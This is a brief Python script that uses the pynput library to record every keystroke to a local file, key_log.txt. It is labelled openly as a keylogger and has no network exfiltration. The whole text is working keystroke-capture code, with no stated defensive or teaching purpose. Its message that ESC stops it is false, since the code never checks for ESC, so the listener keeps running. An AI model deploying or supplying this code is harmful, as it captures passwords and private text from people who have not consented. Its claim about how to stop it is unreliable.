from pynput import keyboard

LOG_FILE = "key_log.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            if hasattr(key, 'char') and key.char:
                f.write(key.char)
            else:
                f.write(f" [{key}] ")
    except Exception as e:
        print("Error:", e)

def main():
    print("Keylogger started... (Press ESC to stop)")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
